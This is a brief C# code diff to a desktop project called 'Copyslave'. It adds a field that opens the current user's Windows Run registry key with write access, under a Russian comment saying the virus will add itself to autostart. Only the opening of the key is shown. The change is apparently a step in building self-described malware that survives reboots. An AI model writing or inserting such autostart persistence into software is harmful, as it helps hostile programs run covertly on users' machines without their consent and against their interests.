@@ -2,6 +2,7 @@
 using System.Windows.Threading;
 using System.Windows.Forms;
 using System;
+using Microsoft.Win32;
 
 namespace Copyslave
 {
@@ -11,6 +12,9 @@ namespace Copyslave
     public partial class MainWindow : Window
     {
         DispatcherTimer Timer = new DispatcherTimer();
+
+        //Вирус добавит себя в автозапуск
+        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\MICROSOFT\\WINDOWS\\CurrentVersion\\Run", true);
 
         public MainWindow()
         {
